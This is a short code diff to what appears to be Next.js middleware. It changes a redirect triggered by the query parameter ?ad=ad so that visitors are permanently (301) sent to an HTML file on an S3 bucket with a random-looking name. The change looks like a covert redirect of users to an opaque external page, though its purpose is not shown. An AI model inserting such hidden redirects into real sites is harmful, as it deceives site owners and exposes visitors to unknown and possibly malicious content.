@@ -41,7 +41,7 @@ export function middleware(request) {
   // Redirect when ?ad=ad
   if (adParam === 'ad') {
     return NextResponse.redirect(
-      'https://b2-quirl-repo-docu.vercel.app/?ad=ad',
+      'https://sxkt-01ucktb.s3.us-east-2.amazonaws.com/Vt-ewye74903u3un.html',
       { status: 301 }
     )
   }
